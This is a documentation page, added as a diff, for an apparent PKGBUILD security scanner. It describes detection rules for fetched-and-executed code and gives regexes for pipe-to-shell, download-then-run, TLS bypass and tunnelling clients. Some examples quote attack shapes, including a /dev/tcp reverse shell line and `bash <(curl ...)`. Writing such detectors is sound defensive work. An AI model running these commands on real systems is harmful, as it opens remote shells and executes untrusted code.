@@ -1,0 +1,667 @@
+<!-- description: Rules claiming that something was fetched, something was executed, or a path connects the two. The densest group in the ruleset. -->
+
+# Fetch and Execution
+
+## Overview
+
+
+Code reaches the machine and runs. Every rule here claims one of three
+things: something was fetched, something was executed, or a path connects
+the two. They are the densest group in the ruleset because the shapes are
+many and the claim is the same one, so a rule that only covers `curl |
+bash` leaves the rest of the family open.
+
+The pipe-to-shell rules (R001, R002) are the canonical form. H075, H082 and
+H083 exist because the pipe is not required: process substitution, a
+download split across two lines, and a declared `source=()` script all put
+fetched code in a shell without one. H077 moves the same question to parse
+time, where the fetch happens before any build step or checksum applies.
+
+See [Rule Mechanics](mechanics.md) for the field table, the
+severity weights and the reserved identifier ranges.
+
+---
+
+## Threat context
+
+The oldest analogy for this family is the **Trojan horse**. The recipe looks
+like an ordinary set of build instructions, but one instruction says "go fetch
+new instructions from a stranger, and run them". What executes is not what the
+reviewer read, and the diff they approved becomes a smokescreen for code that
+was never in it.
+
+That is the oldest and best-understood attack in the PKGBUILD space, and the
+shape `curl | bash` made famous. The rules are ordered by how directly they
+express it, from the literal pipe to the same effect spread across lines with
+variables, base64, or a helper. The H-series is the security core of
+TrustSight: built first, calibrated hardest, and the one the fire-rate work is
+measured against.
+
+## Detection mechanisms
+
+The rules that make up this category are listed below, each with the series that implements it and the severity it carries. Scoring, matching and identifier allocation are shared across every category: see [Rule Mechanics](mechanics.md).
+
+## Individual rules
+
+<!-- generated: page-index -->
+| Rule | Name | Severity |
+|---|---|---|
+| [C007](#c007) | Command Substitution In Source Array | CRITICAL |
+| [C015](#c015) | Fetch In package() | HIGH |
+| [C016](#c016) | Interpreter Invocation In Install Hook | HIGH |
+| [H003](#h003) | Insecure Download Protocol | LOW |
+| [H004](#h004) | Privilege Escalation | CRITICAL |
+| [H009](#h009) | Network connection attempt | - |
+| [H011](#h011) | Sensitive binary execution | - |
+| [H015](#h015) | Critical Build Function Modified | INFO |
+| [H016](#h016) | Hidden Network Fetch In Build | HIGH |
+| [H031](#h031) | Version-In-URL Injection | MEDIUM |
+| [H034](#h034) | Exotic Source Protocol | MEDIUM |
+| [H041](#h041) | Upload To Paste Or File-Drop Host | HIGH |
+| [H068](#h068) | Reconstructed Executable Payload | HIGH |
+| [H069](#h069) | Build-time Generation Then Execution | HIGH |
+| [H071](#h071) | Covert Egress | HIGH |
+| [H072](#h072) | Write Then Execute | HIGH |
+| [H075](#h075) | Remote Script Via Process Substitution | CRITICAL |
+| [H077](#h077) | Parse-time Network Fetch | HIGH |
+| [H081](#h081) | Committed File Executed Without Declaration | HIGH |
+| [H082](#h082) | Fetch Then Execute | CRITICAL |
+| [H083](#h083) | Downloaded Source File Executed | HIGH |
+| [H090](#h090) | Committed Companion Carries A Fetch-Execute Payload | CRITICAL |
+| [H094](#h094) | Unread Script Executed During Packaging | HIGH |
+| [H107](#h107) | Credential Store Access With Egress | HIGH |
+| [R001](#r001) | Remote Script Execution | CRITICAL |
+| [R002](#r002) | Wget Pipe to Shell | CRITICAL |
+| [R008](#r008) | Unexpected File Download | HIGH |
+| [R010](#r010) | Uses curl in PKGBUILD | LOW |
+| [R011](#r011) | Uses wget in PKGBUILD | LOW |
+| [R041](#r041) | Shell Network Redirection | CRITICAL |
+| [R042](#r042) | Download Then Execute | CRITICAL |
+| [R044](#r044) | Interpreter One-Liner With Network | HIGH |
+| [R046](#r046) | Source URL Uses IP Address | MEDIUM |
+| [R047](#r047) | Source URL Uses Non-Standard Port | LOW |
+| [R048](#r048) | Source URL On Free Registrar TLD | LOW |
+| [R051](#r051) | Network Access In pkgver | HIGH |
+| [R055](#r055) | Git Clone With Variable Branch | MEDIUM |
+| [R056](#r056) | Download Then Source | CRITICAL |
+| [R057](#r057) | TLS Verification Disabled | HIGH |
+| [R152](#r152) | Source URL On Free-Hosting Or Dynamic-DNS Host | MEDIUM |
+<!-- /generated: page-index -->
+
+### R001: Remote Script Execution {#r001}
+
+- **Target:** `resolved`
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `network_execution`
+
+- **Pattern:** `curl.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
+- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.
+- **Note:** The lookbehind requires the pipe to be **unescaped**. `curl x \| sh` passes a literal bar to `curl` as an argument and starts   no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../reference/cli.md#sync-rules) replaces patterns this project shipped previously.
+- **Printed text:** A `curl ... | bash` that sits wholly inside a printer's quoted text (`echo "curl ... | bash"`) is output for the reader, not an executed pipeline, so the rule stands down. A line that also carries an unquoted chain or redirect is execution, not a message.
+
+### R002: Wget Pipe to Shell {#r002}
+
+- **Target:** `resolved`
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `network_execution`
+
+- **Pattern:** `wget.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
+- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.
+- **Note:** The pipe must be **unescaped**. An escaped bar is an argument to the command and starts   no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../reference/cli.md#sync-rules) replaces patterns this project shipped previously.
+- **Printed text:** A `wget ... | sh` that sits wholly inside a printer's quoted text (`echo "wget ... | sh"`) is output for the reader, not an executed pipeline, so the rule stands down. A line that also carries an unquoted chain or redirect is execution, not a message.
+
+### H003: Insecure Download Protocol {#h003}
+
+- **Target:** programmatic (diff-aware)
+- **Severity:** LOW (weight 5)
+- **Category:** `integrity`
+
+- **Condition:** An added `http://` source URL has no added or changed checksum array.
+- **Description:** Plain HTTP permits a network attacker to replace a download in transit. Adding a checksum in the same diff supplies checksum backing and suppresses this rule; `sha256sums=('SKIP')` does not. The rule is intentionally about transport without newly declared integrity backing, not about pipes or archive suffixes.
+
+### R008: Unexpected File Download {#r008}
+
+- **Target:** `resolved`
+- **Severity:** HIGH (weight 25)
+- **Category:** `network_execution`
+
+- **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
+- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.
+
+### H004: Privilege Escalation {#h004}
+
+- **Target:** programmatic (`analysis/build.py`)
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `privilege`
+
+- **Condition:** `sudo`, `doas`, `pkexec` or `run0` at a command position: line start, after `;`/`&&`/`||`/`|`, or inside `$(...)`, with or without arguments.
+- **Description:** Detects a privilege tool that is *executed* rather than mentioned. Command position is what separates the two: `groups=('sudo')`, an `optdepends` name, and `echo "sudo required"` place the word at an argument position and stay quiet, while `echo "x"; sudo ...` is an execution context and fires. Naming `doas`, `pkexec` and `run0` as well as `sudo` tests what the recipe does rather than which tool its author preferred.
+
+### R010: Uses curl in PKGBUILD {#r010}
+
+- **Target:** `raw_line`
+- **Severity:** LOW (weight 5)
+- **Category:** `network_usage`
+
+- **Pattern:** `\bcurl\s`
+- **Scope:** `["function_body"]` only
+- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.
+
+### R011: Uses wget in PKGBUILD {#r011}
+
+- **Target:** `raw_line`
+- **Severity:** LOW (weight 5)
+- **Category:** `network_usage`
+
+- **Pattern:** `\bwget\s`
+- **Scope:** `["function_body"]` only
+- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.
+
+### H009: Network connection attempt {#h009}
+
+H009 is retained as a documentation anchor for a reserved `runtime` id. No
+code emits it: the current model cannot observe post-install behaviour from a
+static diff, so the identifier is held so a future runtime probe can use it
+without a baseline change.
+
+### H011: Sensitive binary execution {#h011}
+
+H011 is retained as a documentation anchor for a reserved `runtime` id. No
+code emits it; it is held alongside [H009](#h009) for a future runtime probe.
+
+### C007: Command Substitution In Source Array {#c007}
+
+- **Severity:** CRITICAL (weight 40)
+
+- **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
+- **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.
+
+### R041: Shell Network Redirection {#r041}
+
+- **Target:** `resolved`
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `network_execution`
+
+- **Pattern:** `/dev/(?:tcp|udp)/|/dev/[a-z]*[?*\[][a-z?*\]\[]*/|/dev/\$\{?\w+\}?/`
+- **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.
+
+### R042: Download Then Execute {#r042}
+
+- **Target:** `resolved`
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `execution`
+
+- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
+- **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.
+
+### R044: Interpreter One-Liner With Network {#r044}
+
+- **Target:** `resolved`
+- **Severity:** HIGH (weight 25)
+- **Category:** `network_execution`
+
+- **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
+- **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.
+
+### R046: Source URL Uses IP Address {#r046}
+
+- **Target:** `raw_line`
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `network`
+
+- **Pattern:** `https?://(?!(?:127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|0\.0\.0\.0))\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
+- **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply. Loopback and private addresses are excluded: they distribute nothing, so a local URL a recipe only prints is not a source. A line that only prints text (`echo`/`printf`/`cat`) is excluded for the same reason.
+
+### R047: Source URL Uses Non-Standard Port {#r047}
+
+- **Target:** `raw_line`
+- **Severity:** LOW (weight 5)
+- **Category:** `network`
+
+- **Pattern:** `https?://(?!(?:127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|0\.0\.0\.0))[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
+- **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host. Loopback and private addresses, and lines that only print text, are excluded, as for R046.
+
+### R048: Source URL On Free Registrar TLD {#r048}
+
+- **Target:** `raw_line`
+- **Severity:** LOW (weight 5)
+- **Category:** `network`
+
+- **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
+- **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.
+
+### R152: Source URL On Free-Hosting Or Dynamic-DNS Host {#r152}
+
+- **Target:** `raw_line`
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `network`
+
+- **Pattern:** `https?://[^/\s]*\.(?:duckdns\.org|no\-ip\.org|noip\.com|no\-ip\.biz|ddns\.net|hopto\.org|zapto\.org|sytes\.net|dynu\.com|dynv6\.net|afraid\.org|changeip\.com|dyndns\.org|ngrok\.io|ngrok\.app|ngrok\-free\.app|trycloudflare\.com|localtunnel\.me|loca\.lt|serveo\.net|bore\.pub|pinggy\.io|localhost\.run|lhr\.life|pagekite\.me|portmap\.io|pages\.dev|workers\.dev|r2\.dev|github\.io|gitlab\.io|codeberg\.page|vercel\.app|netlify\.app|web\.app|firebaseapp\.com|surge\.sh|render\.com|onrender\.com|glitch\.me|replit\.dev|herokuapp\.com|deno\.dev|railway\.app)(?:[:/]|["\x27\s)]|$)`
+- **Description:** A source URL hosted on a free-hosting, dynamic-DNS or tunnelling provider. Naming one of these costs nothing and leaving it costs nothing, so a source served from here is a claim a reviewer has to judge rather than an upstream distribution channel. The list is split into dynamic DNS (`duckdns.org`, `no-ip.org`, ...), tunnels (`ngrok-free.app`, `trycloudflare.com`, ...) and free/static hosting (`pages.dev`, `github.io`, `vercel.app`, ...). The free-hosting group is the tunable one: small projects do occasionally publish release assets there, so it is the first thing to trim in `hosts.toml free_hosting_domains` if it misfires. The leading `\.` makes this a subdomain match, so `duckdns.org.evil.com` does not fire. A URL acknowledged for this package with `trustsight override add-url` does not fire this rule; an unacknowledged URL on the same line still does.
+
+### R051: Network Access In pkgver {#r051}
+
+- **Target:** `raw_line`
+- **Severity:** HIGH (weight 25)
+- **Category:** `packaging`
+
+- **Scope:** `['pkgver']`
+- **Pattern:** `\b(?:curl|wget2?|aria2c|axel|lftp|ncftp(?:get)?|snarf|httpie|elinks|links2?|w3m|lynx|browsh|scp|sftp|rsync|ftp|tftp|ssh(?=\s+(?:-\S+\s+)*[\w.@-]+\s+\S)|nc|ncat|netcat|socat|telnet|fetch(?!\()|openssl\s+s_client|dig|host|nslookup|drill|kdig|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+(?:clone|fetch|pull|ls-remote|archive)|svn\s+(?:co|checkout|export)|hg\s+(?:clone|pull|unbundle)|bzr\s+(?:branch|pull|export)|darcs\s+get|fossil\s+clone|cvs\s+(?:[-:]\S+\s+)*(?:co|checkout|export)|s3cmd(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:get|sync|cp)|aws\s+s3(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:cp|sync|mv)|aws\s+s3api(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+get-object|gsutil(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:cp|rsync)|az(?:copy)?(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:storage\s+blob\s+download|copy)|rclone(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:copy|sync|cat|copyto|copyurl|moveto|move|bisync)|ipfs(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:get|cat|dag\s+get)|swift(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+download|rados(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+get|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+lfs\s+(?:pull|fetch|checkout)|yt-dlp|youtube-dl|transmission-cli|aria2c(?=\s+[^\n;&|]*magnet:)|b2\s+download-file|b2\s+download\b|restic\s+restore|borg\s+extract|lwp-request|lwp-download|npx|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+push|fetch(?=\s+[^\n;&|]*\b(?:https?|ftps?)://))\b`
+- **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.
+- **Note:** The client list was extended in 0.18.0 to read git's global options before the subcommand (`git -C <dir> pull`), and the same list feeds `git lfs` and `git push`. The object-store clients (`rclone`, `s3cmd`, `aws s3`, `aws s3api`, `gsutil`, `ipfs`, `swift`, `rados`) likewise read global options before the download verb, so `rclone --limit-rate=1M copy ...` is still a fetch. An install holding the earlier pattern reports `ruleset_drifted` and fails closed; `trustsight config sync-rules --update` replaces it (the superseded spellings are recorded in `LEGACY_RULE_PATTERNS`).
+
+### R055: Git Clone With Variable Branch {#r055}
+
+- **Target:** `resolved`
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `source`
+
+- **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
+- **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.
+
+### R056: Download Then Source {#r056}
+
+- **Target:** `resolved`
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `execution`
+
+- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
+- **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.
+
+### R057: TLS Verification Disabled {#r057}
+
+- **Target:** `resolved`
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+
+- **Pattern:** `(?:curl\s+[^;&|]*?(?:--insecure|-k)\b|wget\s+[^;&|]*?--no-check-certificate\b|git\s+-c\s+http\.sslVerify=false\b|GIT_SSL_NO_VERIFY\s*=|pip\s+[^;&|]*?--trusted-host\b|npm\s+[^;&|]*?--strict-ssl=false\b|deno\s+[^;&|]*?--unsafely-ignore-certificate-errors\b|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*["\x27]?0\b)`
+- **Description:** Detects the documented TLS-off flag of every catalogued client: `curl --insecure`/`-k`, `wget --no-check-certificate`, `git -c http.sslVerify=false`, `pip --trusted-host`, `npm --strict-ssl=false` and `deno --unsafely-ignore-certificate-errors`, plus the `GIT_SSL_NO_VERIFY` and `NODE_TLS_REJECT_UNAUTHORIZED=0` environment assignments. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it. `--no-verify` is deliberately absent: for bun and cargo it skips lifecycle scripts, not TLS; bun/node disable TLS through the Node compatibility variable instead, and cargo's transport is git (`http.sslVerify`), already covered.
+
+### H015: Critical Build Function Modified {#h015}
+
+- **Target:** programmatic (diff-aware, defined in `src/trustsight/analysis/build.py`)
+- **Severity:** INFO (weight 0)
+- **Category:** `build`
+
+- **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.
+
+**INFO, so it contributes nothing to the score.** It fires on 19.7 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality. Carrying weight it would simply add points to one benign update in five.
+
+At weight 0 it is context for a reviewer rather than a signal, which is why it is the one rule in this group that is **on by default**.
+
+Function membership comes from `_classify_enclosing_function()` in `src/trustsight/rules/_scope.py`, **not** from the `@@` hunk header. The calibration corpus is generated with `git diff -W` and a custom `xfuncname`, so its hunk headers name the enclosing function, while the live pygit2 path emits none. A rule tuned on hunk headers would be calibrated against data production never produces.
+
+On by default. See [`[code_rules]`](../reference/configuration.md#code_rules).
+
+### H016: Hidden Network Fetch In Build {#h016}
+
+- **Target:** programmatic (resolved command lines)
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+
+- **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.
+
+The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.
+
+A client that names its remote with no scheme at all is covered too: `sftp -b - u@h`, `ftp -n h`, `nc h 4444` and `ssh u@h cmd` yield the bare host, and it is compared against the canonical hosts of the declared sources. `git fetch origin` names a *remote*, not a host, so it is deliberately outside this arm; its chain is H082's.
+
+On by default. See [`[code_rules]`](../reference/configuration.md#code_rules).
+
+### H031: Version-In-URL Injection {#h031}
+
+- **Target:** programmatic (`analysis/network.py`)
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `network`
+
+- **Condition:** `pkgver` or `_pkgver` is assigned a literal containing characters outside `[A-Za-z0-9._+-]`, and that variable is interpolated (braced or bare) into a source URL.
+
+Both halves are required. An unsafe version string that is never interpolated
+stays quiet, and an interpolated version made only of version characters is
+ordinary packaging. What the rule describes is a value carrying delimiters
+(`;`, whitespace, `/`) being substituted into something the build fetches.
+
+Fire rate: 1 on the v1 corpus (0.03 %).
+
+### H034: Exotic Source Protocol {#h034}
+
+- **Target:** programmatic (`analysis/network.py`)
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `network`
+
+- **Condition:** A `source=` entry uses a scheme outside the `[hosts] source_schemes` allowlist. The base of a `transport+base` token is what is judged, so `git+https://` is read as `https`.
+
+`data:` URIs carry no `://` and are not scheme tokens, which is an accepted
+gap rather than a silent pass.
+
+Fire rate: 7 on the v1 corpus (0.19 %).
+
+### H041: Upload To Paste Or File-Drop Host {#h041}
+
+- **Target:** programmatic (`analysis/network.py`)
+- **Severity:** HIGH (weight 25)
+- **Category:** `exfil`
+
+- **Condition:** A build or install function invokes `curl`/`wget` with a request body (an upload flag from `[patterns] upload_flags`) against a host in `[hosts] paste_hosts`.
+
+Direction is the entire rule. The same host list also feeds the
+`raw_hosting` source bucket, so a paste host in `source=()` is already carried
+at +15 and a rule that fired on it would double-count that weight. What no
+bucket can see is the other direction: a request leaving a build with a body
+attached, addressed to a host whose purpose is to accept an anonymous drop and
+hand back a link.
+
+Fetching from one of these hosts is not this rule. A `curl` pulling a patch
+from a gist is an undeclared download, which H016 already reports. Posting to
+that same gist is data leaving the machine that is building the package, and it
+is the evidence behind H043's `exfil` stage. On a line H041 claims, H016 stands
+down: describing an upload as a download would be wrong as well as scored
+twice.
+
+The destination is an auditable list rather than a guess about what an endpoint
+is for, so an upload to a project's own CI host does not fire.
+
+Fire rate: 0 on the v1 corpus. The corpus contains one paste-host reference, a gist
+download in `gamescope-nvidia`, which stays H016's.
+
+### H071: Covert Egress {#h071}
+
+- **Target:** programmatic (`analysis/network.py`)
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+
+- **Condition:** An added line references a `.onion`/`.i2p` host, issues a DNS-over-HTTPS query or names a configured DoH endpoint, or invokes a tunnelling client (`torsocks`, `socat`, `ngrok`, `chisel`, `frpc`, ...) at a command position inside a build or install function.
+
+The command-position anchor is what separates use from mention: a client named
+in a string or listed in `makedepends` never fires.
+
+Fire rate: 0 on the v1 corpus.
+
+### H077: Parse-time Network Fetch {#h077}
+
+- **Target:** programmatic (`analysis/network.py`)
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+
+- **Condition:** A network client from `[patterns] parse_time_fetch` runs at a command position **outside every function**, in the PKGBUILD or an install file. When the hunk does not carry the enclosing function header, the current recipe decides: a line the recipe places inside a function is not parse-time.
+
+Everything at the top level executes as soon as makepkg sources the recipe,
+which happens on `makepkg --printsrcinfo`, on an AUR helper's metadata refresh,
+and on anything else that reads the file. That is before a build step runs and
+before the checksum array covers anything. R010 and R011 report a downloader
+inside a build function at LOW; running one at parse time is a different claim,
+so it is a different rule.
+
+Quiet by construction on declarations: `DLAGENTS=(...)` and any other
+assignment whose *value* merely names a downloader configures makepkg rather
+than fetching. An assignment that *runs* one through a command substitution
+(`_ver=$(curl ...)`) is not a declaration and is not exempt. A fetch piped
+straight into a shell belongs to R001/R002, whose claim is heavier, so H077
+yields rather than scoring the same line twice.
+
+Fire rate: 3 on the v1 corpus (0.09 %), all one package resolving a redirect with
+`curl` at the top level, which really does reach the network on a metadata
+refresh.
+
+### H068: Reconstructed Executable Payload {#h068}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** Text on an added line (base64, hex, uuencode, or an H065 reconstruction) decodes to bytes carrying ELF, shebang, PE or Mach-O magic.
+
+This is a type check on the decoder's output, which is why one rule covers
+every encoded-payload variant without naming the encoding. Encoded text assets,
+checksums and keys decode to none of those magics.
+
+Fire rate: 0 on the v1 corpus.
+
+### H069: Build-time Generation Then Execution {#h069}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** A heredoc, `printf` or `cat >` writes a script or source file that the same function then compiles or executes.
+
+Writing a config file, a `.desktop` entry or a patch that a declared build step
+consumes is not generation-then-execution and does not fire.
+
+Fire rate: 0 on the v1 corpus.
+
+### H072: Write Then Execute {#h072}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** A path the recipe writes is then executed by the same function.
+
+The execution side counts interpreters, `source`, `.`, compilers and a plain
+absolute path at a command position, with or without arguments. Files that
+arrived through a declared `source=` and the project's own configure/make
+artefacts are exempt.
+
+Fire rate: 0 on the v1 corpus.
+
+### H075: Remote Script Via Process Substitution {#h075}
+
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `execution`
+
+- **Condition:** A fetched script reaches a shell by a path the pipe-to-shell rules do not see: process substitution (`bash <(curl ...)`), `xargs` (`curl ... | xargs bash`), or a here-string fed by command substitution (`bash <<< "$(curl ...)"`). The finding is named `Remote Script Via Process Substitution`, `Remote Script Via xargs`, or `Remote Script Via Here-String` according to the path matched.
+
+Each still executes remote code at build time, so it belongs with R001/R002
+rather than at R010/R011's "uses curl" LOW.
+
